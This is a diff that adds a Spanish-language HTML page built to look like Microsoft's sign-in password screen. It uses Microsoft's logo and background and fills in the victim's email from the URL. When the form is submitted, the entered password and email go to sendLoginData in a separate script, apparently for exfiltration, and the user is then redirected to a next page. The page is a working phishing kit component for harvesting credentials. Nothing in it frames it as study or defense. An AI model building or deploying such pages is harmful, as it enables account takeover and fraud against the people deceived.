@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escribir contraseña</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="xjsx.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .ms-card {
+            background: white;
+            padding: 44px;
+            width: 100%;
+            max-width: 440px; /* Tamaño real de Microsoft */
+            min-height: 350px; /* Evita que se vea chiquita */
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        .back-arrow {
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+        .back-arrow:hover { background: #e5e5e5; }
+    </style>
+</head>
+<body>
+    <div class="ms-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="h-6 mb-4" alt="Microsoft">
+        
+        <div class="flex items-center gap-2 mb-4">
+            <div class="back-arrow" onclick="history.back()">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 12L6 8L10 4" stroke="#505050" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <span id="displayEmail" class="text-[15px] text-[#1b1b1b] truncate"></span>
+        </div>
+
+        <h1 class="text-2xl font-semibold text-[#1b1b1b] mb-4">Escribir contraseña</h1>
+        
+        <form onsubmit="handleLogin(event)">
+            <input type="password" id="pass" placeholder="Contraseña" 
+                   class="w-full border-b border-black py-2 focus:outline-none focus:border-[#0067b8] mb-8 text-[15px]" 
+                   required autofocus>
+            
+            <div class="text-[13px] mb-8">
+                <a href="#" class="text-[#0067b8] hover:underline">¿Olvidó su contraseña?</a>
+            </div>
+
+            <div class="flex justify-end">
+                <button type="submit" id="btn" class="bg-[#0067b8] text-white px-10 py-1.5 hover:bg-[#005da6] rounded-[2px] text-[15px]">
+                    Iniciar sesión
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const email = new URLSearchParams(window.location.search).get('email');
+        document.getElementById('displayEmail').textContent = email || 'usuario@example.com';
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            const pass = document.getElementById('pass').value;
+            
+            btn.disabled = true;
+            btn.innerText = 'Iniciando...';
+            
+            // Llamada a tu xjsx.js
+            if (typeof sendLoginData === 'function') {
+                await sendLoginData(email, pass);
+            }
+            
+            window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
+        }
+    </script>
+</body>
+</html>
